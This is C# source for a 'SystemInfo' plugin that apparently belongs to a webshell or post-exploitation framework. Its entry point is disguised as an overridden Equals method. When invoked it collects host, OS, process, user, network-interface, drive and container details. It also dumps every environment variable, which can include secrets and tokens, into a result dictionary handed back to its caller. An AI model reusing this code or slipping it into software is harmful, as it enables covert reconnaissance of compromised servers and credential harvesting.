using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace NoOne.Plugins.Dotnet.SystemInfo
{
    public sealed class DotnetSystemInfoPlugin
    {
        public override bool Equals(object obj)
        {
            IDictionary<string, object> ctx = obj as IDictionary<string, object>;
            if (ctx == null)
            {
                return true;
            }

            Dictionary<string, object> systemInfo = new Dictionary<string, object>();
            try
            {
                systemInfo["os"] = GetOs();
                systemInfo["runtime"] = GetRuntime();
                systemInfo["env"] = GetEnv();
                systemInfo["process"] = GetProcess();
                systemInfo["network"] = GetNetwork();
                systemInfo["file_systems"] = GetFileSystems();
            }
            catch (Exception ex)
            {
                systemInfo["error"] = "Failed to collect system info: " + ex.Message;
            }

            ctx["result"] = systemInfo;
            return true;
        }

        public override int GetHashCode()
        {
            return 0;
        }

        private static Dictionary<string, object> GetOs()
        {
            Dictionary<string, object> result = new Dictionary<string, object>();
            result["name"] = RuntimeInformation.OSDescription;
            result["version"] = Environment.OSVersion.VersionString;
            result["arch"] = RuntimeInformation.OSArchitecture.ToString().ToLowerInvariant();
            result["platform_type"] = GetPlatformType();
            try
            {
                result["hostname"] = Dns.GetHostName();
            }
            catch
            {
                result["hostname"] = "unknown";
            }
            return result;
        }

        private static Dictionary<string, object> GetRuntime()
        {
            Dictionary<string, object> result = new Dictionary<string, object>();
            result["type"] = "dotnet";
            result["version"] = RuntimeInformation.FrameworkDescription;
            result["mem"] = GetRuntimeMem();
            return result;
        }

        private static Dictionary<string, object> GetRuntimeMem()
        {
            Dictionary<string, object> info = new Dictionary<string, object>();
            try
            {
                using (Process process = Process.GetCurrentProcess())
                {
                    info["heap_used"] = GC.GetTotalMemory(false);
                    info["working_set"] = process.WorkingSet64;
                    info["private_mem"] = process.PrivateMemorySize64;
                }
            }
            catch (Exception ex)
            {
                info["error"] = "Failed to get runtime memory: " + ex.Message;
            }
            return info;
        }

        private static Dictionary<string, object> GetProcess()
        {
            Dictionary<string, object> info = new Dictionary<string, object>();
            try
            {
                using (Process process = Process.GetCurrentProcess())
                {
                    DateTime startTime = process.StartTime;
                    long uptimeMs = (long)Math.Max(0, (DateTime.Now - startTime).TotalMilliseconds);

                    info["pid"] = process.Id.ToString();
                    info["start_time"] = startTime.ToString("o");
                    info["uptime_ms"] = uptimeMs;
                    info["user"] = Environment.UserName;
                    info["cwd"] = Environment.CurrentDirectory;
                    info["tmp_dir"] = Path.GetTempPath();
                    info["user_home"] = GetUserHome();
                    info["argv"] = Environment.GetCommandLineArgs();
                }
            }
            catch (Exception ex)
            {
                info["error"] = "Failed to collect process info: " + ex.Message;
            }
            return info;
        }

        private static string GetUserHome()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (!string.IsNullOrWhiteSpace(path))
            {
                return path;
            }

            string home = Environment.GetEnvironmentVariable("HOME");
            if (!string.IsNullOrWhiteSpace(home))
            {
                return home;
            }

            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            return string.IsNullOrWhiteSpace(userProfile) ? string.Empty : userProfile;
        }

        private static List<Dictionary<string, object>> GetFileSystems()
        {
            List<Dictionary<string, object>> fileSystemInfo = new List<Dictionary<string, object>>();
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                try
                {
                    if (!drive.IsReady)
                    {
                        continue;
                    }

                    Dictionary<string, object> fsInfo = new Dictionary<string, object>();
                    fsInfo["path"] = drive.Name;
                    fsInfo["total_space"] = drive.TotalSize;
                    fsInfo["free_space"] = drive.TotalFreeSpace;
                    fsInfo["usable_space"] = drive.AvailableFreeSpace;
                    fileSystemInfo.Add(fsInfo);
                }
                catch
                {
                    // ignored
                }
            }
            return fileSystemInfo;
        }

        private static object GetNetwork()
        {
            try
            {
                List<Dictionary<string, object>> interfaces = new List<Dictionary<string, object>>();
                IEnumerable<NetworkInterface> networkInterfaces = NetworkInterface
                    .GetAllNetworkInterfaces()
                    .Where(ni => ni.OperationalStatus == OperationalStatus.Up);

                foreach (NetworkInterface ni in networkInterfaces)
                {
                    List<string> ips = new List<string>();
                    foreach (UnicastIPAddressInformation address in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (address.Address == null)
                        {
                            continue;
                        }
                        if (address.Address.AddressFamily != AddressFamily.InterNetwork &&
                            address.Address.AddressFamily != AddressFamily.InterNetworkV6)
                        {
                            continue;
                        }
                        ips.Add(address.Address.ToString());
                    }

                    if (ips.Count == 0)
                    {
                        continue;
                    }

                    Dictionary<string, object> niInfo = new Dictionary<string, object>();
                    niInfo["name"] = ni.Name;
                    niInfo["ips"] = string.Join(",", ips);
                    interfaces.Add(niInfo);
                }
                return interfaces;
            }
            catch (Exception ex)
            {
                Dictionary<string, object> error = new Dictionary<string, object>();
                error["error"] = "Failed to collect system info: " + ex.Message;
                return error;
            }
        }

        private static string GetPlatformType()
        {
            try
            {
                if (File.Exists("/.dockerenv"))
                {
                    return "docker";
                }
            }
            catch
            {
                // ignored
            }

            if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("KUBERNETES_SERVICE_HOST")))
            {
                return "k8s";
            }

            try
            {
                if (Directory.Exists("/var/run/secrets/kubernetes.io"))
                {
                    return "k8s";
                }
            }
            catch
            {
                // ignored
            }

            return "host";
        }

        private static Dictionary<string, string> GetEnv()
        {
            Dictionary<string, string> env = new Dictionary<string, string>();
            try
            {
                IDictionary variables = Environment.GetEnvironmentVariables();
                foreach (DictionaryEntry entry in variables)
                {
                    string key = entry.Key == null ? string.Empty : entry.Key.ToString();
                    if (string.IsNullOrEmpty(key))
                    {
                        continue;
                    }
                    string value = entry.Value == null ? string.Empty : entry.Value.ToString();
                    env[key] = value;
                }
            }
            catch
            {
                // ignored
            }
            return env;
        }
    }
}
